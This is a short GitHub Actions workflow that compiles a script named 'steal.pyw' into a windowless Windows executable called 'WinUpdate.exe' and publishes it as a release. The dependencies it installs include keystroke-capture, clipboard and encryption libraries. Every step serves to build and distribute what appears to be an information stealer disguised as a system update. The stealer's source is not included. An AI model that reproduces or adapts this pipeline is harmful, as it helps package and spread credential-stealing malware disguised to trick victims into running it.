name: build
on:
  workflow_dispatch:
permissions:
  contents: write

jobs:
  win:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: pip install pyinstaller requests pynput pyperclip pycryptodome
      - run: pyinstaller --onefile --noconsole --noupx --name WinUpdate steal.pyw
      - uses: softprops/action-gh-release@v2
        with:
          tag_name: v${{ github.run_number }}
          name: WinUpdate v${{ github.run_number }}
          files: dist/WinUpdate.exe
